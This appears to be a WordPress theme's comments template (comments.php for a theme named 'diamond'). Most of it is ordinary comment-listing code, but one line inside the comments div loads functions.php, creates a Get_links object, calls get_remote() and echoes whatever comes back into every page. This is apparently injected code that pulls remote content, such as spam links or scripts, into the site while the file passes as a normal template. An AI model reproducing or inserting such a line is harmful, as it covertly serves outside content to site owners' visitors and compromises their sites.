<?php
/**
 * The template for displaying comments
 *
 * The area of the page that contains both current comments
 * and the comment form.
 *
 * @package WordPress

 */

/*
 * If the current post is protected by a password and
 * the visitor has not yet entered the password we will
 * return early without loading the comments.
 */
if ( post_password_required() ) {
	return;
}
?>
    <div id="comments" class="comments-area">
	<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); $links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
        <?php if ( have_comments() ) : ?>
            <div class="comments-title-container">
                <h2 class="comments-title">
                    <?php
                        printf( _nx( 'One thought on &ldquo;%2$s&rdquo;', '%1$s thoughts on &ldquo;%2$s&rdquo;', get_comments_number(), 'comments title', 'diamond' ),
                            number_format_i18n( get_comments_number() ), get_the_title() );
                    ?>
                </h2>
            </div>
            <?php diamond_comment_nav(); ?>

            <ol class="comment-list">
                <?php
                    wp_list_comments( array(
                        'style'       => 'ol',
                        'short_ping'  => true,
                        'avatar_size' => 56,
                    ) );
                ?>
            </ol><!-- .comment-list -->

            <?php diamond_comment_nav(); ?>

        <?php endif; // have_comments() ?>

        <?php
            // If comments are closed and there are comments, let's leave a little note, shall we?
            if ( ! comments_open() && get_comments_number() && post_type_supports( get_post_type(), 'comments' ) ) :
        ?>
            <p class="no-comments"><?php _e( 'Comments are closed.', 'diamond' ); ?></p>
        <?php endif; ?>

        <?php comment_form(array('comment_notes_after' => '')); ?>

    </div><!-- .comments-area -->